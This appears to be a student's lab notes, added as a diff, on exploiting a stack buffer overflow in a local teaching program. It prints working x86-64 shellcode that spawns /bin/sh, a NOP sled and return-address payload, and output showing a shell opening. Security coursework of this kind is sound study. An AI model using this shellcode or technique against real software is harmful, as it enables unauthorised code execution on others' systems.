@@ -1,0 +1,35 @@
+// this link for all steps:
+// https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
+// For some reason does not work wit NOPs in front of shellcode
+// the ret_addr changes, adjust it if you get a seg fault (gdb to find out the correct ret addr)
+// I modified bof.c so that &name is printed to help me out debugging, and changed it back when got it working
+// the input for exploiting flag need to be inserted manually, or else the opened shell will be instantly closed because some i/o stream issues, look it up:
+// https://stackoverflow.com/questions/46819195/shell-launched-from-shellcode-immediatly-stop-upon-launching
+
+
+./mybof $(python -c 'print "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"+"\x90"*98+"\x45"*8+"\x10\xe0\xff\xff\xff\x7f"')
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzdcbadcbadcbadcba 
+flag: ffffe0dc -  val: 61626364
+name addr: ffffe010
+name: H1�H�//bin/shH�SH��PWH���;��������������������������������������������������������������������������������������������������EEEEEEEE����
+$ whoami
+davide
+$ exit
+
+// short version 
+
+./mybof $(cat badfile.txt)
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzdcbadcbadcbadcba
+$ whoami
+davide
+$ exit
+
+// looks like I'm not able to open a root shell even changing the program's ownership to root and setting the setuid bit
+// bash & dash are not opened as root(?) (saw something in theory lessions)
+
+
+
+
+
+
+
